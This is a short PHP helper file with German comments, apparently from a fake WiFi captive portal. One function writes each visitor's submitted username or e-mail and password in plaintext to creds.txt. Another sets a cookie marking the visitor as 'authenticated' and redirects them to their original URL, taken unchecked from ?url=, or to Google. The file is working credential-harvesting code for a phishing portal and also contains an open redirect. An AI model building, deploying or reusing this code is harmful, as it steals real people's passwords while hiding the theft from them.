<?php
// helper.php

/**
 * Loggt Credentials in creds.txt im Portal-Ordner.
 *
 * @param string $type  'GUEST' oder 'LOGIN'
 * @param string $user  E-Mail oder Benutzername
 * @param string $pass  Passwort
 */
function log_credentials(string $type, string $user, string $pass) {
    $entry = sprintf("%s | user=%s | pass=%s%s", $type, $user, $pass, PHP_EOL);
    file_put_contents(__DIR__ . '/creds.txt', $entry, FILE_APPEND | LOCK_EX);
}

/**
 * Setzt ein Cookie, damit index.html erkennt, dass bereits „authentifiziert“ wurde,
 * und leitet entweder zur Original-URL (aus ?url=) oder zum Fallback (Google) weiter.
 *
 * @param string|null $url  URL aus ?url=<...>
 */
function helper_redirect(?string $url) {
    // 1) Cookie setzen (1 Stunde gültig)
    setcookie('custom_portal_authed', '1', time() + 3600, '/');

    // 2) Wenn Original-URL vorhanden, dorthin weiterleiten
    if (!empty($url)) {
        $target = filter_var(urldecode($url), FILTER_SANITIZE_URL);
        header("Location: " . $target);
        exit;
    }

    // 3) Ohne URL-Parameter: Fallback auf Google
    header("Location: http://www.google.com/");
    exit;
}
?>
